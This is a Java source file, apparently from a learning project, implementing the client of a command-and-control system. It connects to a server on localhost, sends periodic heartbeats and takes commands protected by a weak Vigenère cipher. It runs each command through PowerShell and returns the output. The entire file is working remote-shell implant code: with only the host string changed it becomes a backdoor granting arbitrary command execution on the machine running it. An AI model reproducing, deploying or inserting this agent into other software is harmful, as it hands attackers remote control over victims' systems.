import java.io.*;
import java.net.*;
import java.util.concurrent.LinkedBlockingQueue;

/**
 * Client side of the C2 system.
 *
 * This client connects to the server, listens for encrypted commands,
 * decrypts them, queues them for processing, executes them asynchronously,
 * and returns the command output back to the server (encrypted again).
 *
 * The client has 3 main responsibilities:
 * 1. Maintain a TCP connection with the server.
 * 2. Send periodic heartbeat messages so the server can track its liveness.
 * 3. Execute incoming commands in a non-blocking way using an internal queue.
 *
 * Notes:
 * - Command execution here is Windows/PowerShell only.
 * - Heartbeat and command processing run on separate threads.
 */

public class Client {

    static final VigenereCipher cipher = new VigenereCipher("secretkey");
    static final LinkedBlockingQueue<String> commandQueue = new LinkedBlockingQueue<>(); // geekforgeeks
                                                                                         // https://www.geeksforgeeks.org/java/linkedblockingqueue-class-in-java/

    public static void main(String[] args) throws IOException {
        try (Socket socket = new Socket("localhost", 5000)) {
            System.out.println("Connected to server");

            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);

            // Heartbeat thread:
            // Sends a periodic "heartbeat" message to the server every 5 seconds.
            // This lets the server track whether the client is still alive.
            Thread heartbitThread = new Thread(() -> {
                try {
                    while (!socket.isClosed() && out != null) {
                        Thread.sleep(5000);
                        out.println(cipher.encrypt("heartbeat"));
                    }
                } catch (Exception e) {
                    System.out.println("heartbeat stopped");
                }

            });
            heartbitThread.start();

            // Command processor thread:
            // Waits for commands to arrive in the queue, executes them,
            // and sends the output back to the server.
            Thread processorThread = new Thread(() -> {
                try {
                    while (true) {
                        String cmd = commandQueue.take(); // waits for command
                        System.out.println("Processing: " + cmd);

                        // execute kill command
                        if (cmd.equals("kill")) {
                            System.out.println("Server ordered termination. Closing client.");
                            socket.close();
                            return;
                        }

                        // execute bash command
                        String output = executeCommand(cmd).replace("\n", " ").toLowerCase();
                        out.println(cipher.encrypt(output));
                        System.out.println("Sent back: " + output);

                        // default echo is unnecessary because echo already exists as a built-in bash
                        // command
                        // } else if (command.equals("ECHO")){
                        // System.out.println("Server ordered echo response from the client.");
                        // String returnMsg = "Hello World";
                        // System.out.println(returnMsg);
                        // out.println(cipher.encrypt(returnMsg));
                        // System.out.println("sending back to server " + returnMsg);
                    }
                } catch (Exception e) {
                    System.out.println("Processor stopped");
                }
            });
            processorThread.start();

            // Main receive loop:
            // Reads encrypted messages from the server, decrypts them,
            // and pushes the decrypted commands into the queue.
            String encryptCommand;
            while ((encryptCommand = in.readLine()) != null) {
                String command = cipher.decrypt(encryptCommand);
                commandQueue.put(command);

            }

            socket.close();
        } catch (Exception e) {
            System.out.println("Server disconnected");
        }
    }

    // Executes a shell command using PowerShell (Windows-only).
    // The output of the command is collected and returned as a single string.
    // stack over flow -
    // https://www.geeksforgeeks.org/java/java-runtime-exec-method/

    private static String executeCommand(String command) {
        Process process;
        StringBuilder result = new StringBuilder();

        try {
            process = Runtime.getRuntime().exec(new String[] { "powershell.exe", "/c", command }); // Note: This project
                                                                                                   // currently supports
                                                                                                   // Windows-only
                                                                                                   // command execution.

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

            String line = "";
            while ((line = reader.readLine()) != null) {
                result.append(line).append("\n");
            }

            process.waitFor();

        } catch (Exception e) {
            result.append("error while proccessing the command");
        }

        return result.toString();

    }
}
